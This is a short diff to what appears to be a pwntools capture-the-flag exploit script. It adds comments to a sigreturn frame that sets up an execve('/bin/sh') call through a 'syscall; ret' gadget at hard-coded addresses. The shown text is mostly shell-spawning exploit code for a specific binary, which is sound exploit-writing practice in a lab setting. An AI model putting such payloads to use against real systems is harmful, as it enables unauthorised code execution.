@@ -10,7 +10,9 @@ syscall = pack(0x0000000000401047)
 
 srop = SigreturnFrame()
 srop.rax = 59
+# location of syscall; ret
 srop.rip = 0x0000000000401047
+# location of binsh
 srop.rdi = 0x0040200f
 srop.rsi = 0
 
